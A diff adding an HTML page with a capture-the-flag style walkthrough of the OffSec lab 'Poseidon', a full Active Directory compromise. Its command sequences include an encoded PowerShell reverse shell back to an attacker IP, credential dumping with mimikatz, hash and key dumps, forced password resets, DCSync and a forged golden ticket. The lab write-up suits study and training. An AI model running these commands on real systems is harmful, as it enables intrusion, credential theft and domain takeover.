@@ -1,0 +1,322 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">OffSec Challenge Lab 8 : Poseidon</h1>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/poseidon/163]
+└─$ cat tcp                                              
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 04:41 EST
+Nmap scan report for 192.168.202.163
+Host is up (0.10s latency).
+
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5040/tcp open  unknown
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+7680/tcp open  pando-pub?</code></pre></div>
+<p class="text">I logon to the machine with provided credential Eric.Wallows using evil-winrm.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/poseidon/163]
+└─$ evil-winrm -i 192.168.195.163 -u Eric.Wallows -p 'EricLikesRunning800'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\eric.wallows\Documents></code></pre></div>
+
+<p class="text">Since Eric has SeImpersonetePrivilege, I could upgrade user to NA Authority user.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/PrintSpoofer]
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</code></pre></div>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\eric.wallows\desktop> net use \\192.168.45.212\share
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\eric.wallows\desktop> copy \\192.168.45.212\share\PrintSpoofer64.exe</code></pre></div>
+<p class="text">I send reverse shell.</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\eric.wallows\desktop> .\PrintSpoofer64.exe -i -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK</code></pre></div>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows/PrintSpoofer]
+└─$ rlwrap nc -lvnp 4444                                 
+listening on [any] 4444 ...
+connect to [192.168.45.212] from (UNKNOWN) [192.168.195.163] 55108
+whoami
+nt authority\system
+PS C:\Windows\system32> </code></pre></div>
+
+
+
+
+<h2 class="subtitle">Credential Extraction</h2>
+<p class="text">Since I got local admin privilege, I uploaded mimikatz.exe and extracted all stored NTLM hashes.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies</code></pre></div>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> net use \\192.168.45.212\share
+The command completed successfully.
+
+PS C:\users\administrator\desktop> copy \\192.168.45.212\share\mimikatz.exe</code></pre></div>
+<p class="text">I executed below code:</p>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > mimikatz01.txt</code></pre></div>
+<p class="text">To make it able to analyze this file on my local kali machine, I copied generated file to my kali machine.</p>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> copy mimikatz01.txt \\192.168.45.212\share</code></pre></div>
+<p class="text">Reading this file, I found lisa's credential.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/poseidon/163]
+└─$ cat mimikatz01.txt     
+��
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 325628 (00000000:0004f7fc)
+Session           : Service from 0
+User Name         : lisa
+Domain            : sub
+Logon Server      : DC02
+Logon Time        : 2/20/2025 11:02:25 PM
+SID               : S-1-5-21-4168247447-1722543658-2110108262-1106
+        msv :
+         [00000003] Primary
+         * Username : lisa
+         * Domain   : sub
+         * NTLM     : 905ae9b4d957545fb7b9ea0c4333247b
+         * SHA1     : 469cc5a177cf467cc0bd5759ef046155c7434ce7
+         * DPAPI    : d6dd3ca4075a7884d2cad98a6cea83c0
+        tspkg :
+        wdigest :
+         * Username : lisa
+         * Domain   : sub
+         * Password : LisaWayToGo456
+        kerberos :
+         * Username : lisa
+         * Domain   : SUB.POSEIDON.YZ</code></pre></div>
+
+
+
+<h2 class="subtitle">BloodHound</h2>
+<p class="txt">To analyze target's AD structure, I uploaded SharpHound.exe and collected information.</p>
+<p class="text">First, I uploaded SharpHound.exe like before and executed the file.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/bloodhound]
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</code></pre></div>
+
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> net use \\192.168.45.212\share
+Local name        
+Remote name       \\192.168.45.212\share
+Resource type     Disk
+Status            Disconnected
+# Opens           0
+# Connections     1
+The command completed successfully.
+
+PS C:\users\administrator\desktop> copy \\192.168.45.212\share\SharpHound.exe
+
+PS C:\users\administrator\desktop> .\SharpHound.exe</code></pre></div>
+<p class="text">After waiting for a while, I leave NA user command session since the command shell freezed. But zip file to analyze was successfully generated.</p>
+<p class="text">After re-creating powershell session using PrintSpoofer64 like before, I copided generated zip file to my local kali machine.</p>
+<div class="code-box"><pre><code>PS C:\users\administrator\desktop> dir
+
+
+    Directory: C:\users\administrator\desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         12/7/2025  11:37 AM          28564 20251206095749_BloodHound.zip                                                                               
+-a----         12/7/2025  11:31 AM          25344 mimikatz01.txt                                                       
+-a----         12/7/2025  11:22 AM             34 proof.txt                                                            
+-a----         11/9/2025   3:39 AM        1311232 SharpHound.exe 
+
+PS C:\users\administrator\desktop> copy 20251206095749_BloodHound.zip \\192.168.45.212\share</code></pre></div>
+<p class="text">I uploaded this zip file to Bloodhound.</p>
+
+<h2 class="subtitle">Access to DC02</h2>
+<p class="text">Since the user lisa has AllExtendedRight against jackie, I could change password of him. Also, since the user jackie has PSRemote right, I could logon to DC02 using changed password.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/poseidon/1.png' %}" alt="">
+    <img src="{% static 'EthHack/images/poseidon/2.png' %}" alt="">
+</div>
+
+<p class="text">To change password for jackie, I executed command below:</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ bloodyAD -d sub.poseidon.yzx --host 192.168.202.162 -u lisa -p 'LisaWayToGo456' set password 'jackie' '3asypwn!'
+[+] Password changed successfully!</code></pre></div>
+<p class="text">Then, I launched evil-winrm.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ evil-winrm -i 192.168.195.162 -u jackie -p '3asypwn!'                          
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\jackie\Documents> </code></pre></div>
+
+
+
+<h2 class="subtitle">Privilege Escalation on DC02</h2>
+<p class="text">Since the user jackie has GenericAll privilege against DC02.sub.poseidon.yzx computer, we can change virtual computer account.</p>
+<p class="text">Using changed passoword, I could request DCsync because virtual computer acccount is authenticated as sub.poseidon.yzx/DC02$ by Kerberos, and the acccount DC02$ has DCsync right as it is computer itself.</p>
+<p class="text">On the DC02, I ran the command below:</p>
+<div class="code-box"><pre><code>*Evil-WinRM* PS C:\Users\jackie\Documents> Import-Module ActiveDirectory
+*Evil-WinRM* PS C:\Users\jackie\Documents> $NewPass = ConvertTo-SecureString 'Dc02NewP@ssw0rd!' -AsPlainText -Force
+Set-ADAccountPassword -Identity 'DC02$' -Reset -NewPassword $NewPass</code></pre></div>
+<p class="text">Then, I used impacket-secretsdump to extract domain users' NTLM hashes.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$  impacket-secretsdump \
+  sub.poseidon.yzx/DC02\$:'Dc02NewP@ssw0rd!'@192.168.195.162
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3bcdd818f7ec942ac91aa30d8db71927:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+sub.poseidon.yzx\chen:1104:aad3b435b51404eeaad3b435b51404ee:c4ddb64252adfc9e0558353099ded495:::
+sub.poseidon.yzx\jackie:1105:aad3b435b51404eeaad3b435b51404ee:2754164a6db113a199d67030187261a7:::
+sub.poseidon.yzx\lisa:1106:aad3b435b51404eeaad3b435b51404ee:905ae9b4d957545fb7b9ea0c4333247b:::
+sub.poseidon.yzx\eric.wallows:7101:aad3b435b51404eeaad3b435b51404ee:a1f18f9362b5485cca07aedda6792454:::
+DC02$:1000:aad3b435b51404eeaad3b435b51404ee:0d74bc0b1f12b767c8bb968e0cb95618:::
+GYOZA$:1107:aad3b435b51404eeaad3b435b51404ee:363114b7de287e141c75f10433412541:::
+POSEIDON$:1103:aad3b435b51404eeaad3b435b51404ee:01196f308a81e26264eb41dbb4b3e668:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e2786e98a3205f9085ef7071d992422f735ce704f4ba5c29f65f25beed348228
+Administrator:aes128-cts-hmac-sha1-96:b6593732b7ab7cecd59afadef15b4315
+Administrator:des-cbc-md5:e0e03d58a15d315e
+krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2
+krbtgt:aes128-cts-hmac-sha1-96:b5d83edef61d3c3799047e208e13b2c7
+krbtgt:des-cbc-md5:b95ee5a11c10d989
+sub.poseidon.yzx\chen:aes256-cts-hmac-sha1-96:f82ec7ba1f7bde73f1549522dde64ca50dd7ff961efcec17939e567a249da43f
+sub.poseidon.yzx\chen:aes128-cts-hmac-sha1-96:cfe54b16b15b6b2ab05e29c668e3bd6a
+sub.poseidon.yzx\chen:des-cbc-md5:e668b01cf4625ed6
+sub.poseidon.yzx\jackie:aes256-cts-hmac-sha1-96:0dd7d0d34b24c1fbccc995ce0a24c39a5b187fe94d6d1dc6bac3ad52e5a1fd08
+sub.poseidon.yzx\jackie:aes128-cts-hmac-sha1-96:a10102417bc86708b93702f9e2ff951d
+sub.poseidon.yzx\jackie:des-cbc-md5:fedc4f40c1a74626
+sub.poseidon.yzx\lisa:aes256-cts-hmac-sha1-96:c9f63c9c18b1cf994a0296106a91d61168e76f28a030e0e553dbdd27dd9834ef
+sub.poseidon.yzx\lisa:aes128-cts-hmac-sha1-96:65e93d705fc16a2f47edd6925fc68739
+sub.poseidon.yzx\lisa:des-cbc-md5:a2138cb9b319e673
+sub.poseidon.yzx\eric.wallows:aes256-cts-hmac-sha1-96:8bef0f8a4c1efdd44a6641df5e0e1b94288c93b93f29f95cc7020d2c760e9d15
+sub.poseidon.yzx\eric.wallows:aes128-cts-hmac-sha1-96:64e9f94de2a3cd60cdfd9a0e7b2d6675
+sub.poseidon.yzx\eric.wallows:des-cbc-md5:45ecc1200d7f6762
+DC02$:aes256-cts-hmac-sha1-96:031d05185637ac8d4c7ff0ce35fe61b76aa5a57947ddf35c329107f419e515cb
+DC02$:aes128-cts-hmac-sha1-96:57b0e964b7fa2149f2302faa9cc88057
+DC02$:des-cbc-md5:916b833b2ad60e32
+GYOZA$:aes256-cts-hmac-sha1-96:330f12b84dca9349659952461c86618ce9bbd1322440ce885df223264f351c1b
+GYOZA$:aes128-cts-hmac-sha1-96:009a2964d5c3aab6b157031bfe19bd3f
+GYOZA$:des-cbc-md5:e0b938255bbf64b9
+POSEIDON$:aes256-cts-hmac-sha1-96:2618b7c5368e0265beeb5ac94fc9aa5019b16756550165d31378f03d84b006f8
+POSEIDON$:aes128-cts-hmac-sha1-96:69c985205083323653af6afce39caee3
+POSEIDON$:des-cbc-md5:7545074cce61d9b9
+[*] Cleaning up... </code></pre></div>
+
+<p class="text">I could use this administrator's NTLM hash to logon to DC02.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ evil-winrm -i 192.168.195.162 -u administrator -H 3bcdd818f7ec942ac91aa30d8db71927
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> </code></pre></div>
+
+
+
+<h2 class="subtitle">Golden Ticket</h2>
+<p class="text">To access to dc01, I needed to create Golden ticket.</p>
+<p class="textt">For that purpose, I extracted AES key for krbtgt user using impacket-secretsdump.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/poseidon/163]
+└─$ impacket-secretsdump \
+  sub.poseidon.yzx/DC02\$:'Dc02NewP@ssw0rd!'@192.168.195.162 \
+  -just-dc-user sub/krbtgt 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:<u>b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2</u>
+krbtgt:aes128-cts-hmac-sha1-96:b5d83edef61d3c3799047e208e13b2c7
+krbtgt:des-cbc-md5:b95ee5a11c10d989
+[*] Cleaning up... </code></pre></div>
+<p class="text">Then, I searched domain SID and enterprise admins SID to create golden ticket which contains admin privilege and enterprise admins right.</p>
+<p class="text">I could found domain SID in BloodHound, and enterprise admins SID in <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">here</a>.</p>
+<div class="code-box"><pre><code>impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
+-domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
+-domain sub.poseidon.yzx \
+-extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \
+ administrator -extra-pac
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for sub.poseidon.yzx/administrator
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncASRepPart
+[*] Saving ticket in administrator.ccache</code></pre></div>
+<p class="text">I set generated TGT to my enrironment variable:</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo/poseidon/163]
+└─$ export KRB5CCNAME=administrator.ccache</code></pre></div>
+
+<p class="text">Since I got valid kerberos ticket, I can use it for establishing connection with impacket-psexec.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils/Windows]
+└─$ impacket-psexec 'sub.poseidon.yzx/administrator@dc01.poseidon.yzx' -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc01.poseidon.yzx.....
+[*] Found writable share ADMIN$
+[*] Uploading file oqCPEeQv.exe
+[*] Opening SVCManager on dc01.poseidon.yzx.....
+[*] Creating service MrXV on dc01.poseidon.yzx.....
+[*] Starting service MrXV.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32></code></pre></div>
+
+<p class="text">We got user nt authority\system.</p>
+
+
+
+
+
+</body>
+</html>
